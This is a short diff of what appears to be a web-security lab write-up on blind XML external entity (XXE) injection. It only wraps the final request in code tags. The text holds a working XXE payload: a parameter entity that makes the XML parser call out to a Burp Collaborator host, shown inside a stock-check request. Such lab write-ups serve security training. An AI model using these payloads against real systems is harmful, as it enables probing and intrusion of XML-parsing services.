@@ -8,7 +8,9 @@ To solve the lab, use a parameter entity to make the XML parser issue a DNS look
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "2ruibhhghox7cp0i7q0y71p9e0ks8h.burpcollaborator.net"> %xxe; ]>
 
 Final XML request:
+<pre><code>
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://2ruibhhghox7cp0i7q0y71p9e0ks8h.burpcollaborator.net"> %xxe; ]>
   <stockCheck>
   <productId>2</productId><storeId>2</storeId></stockCheck>
+</code></pre>
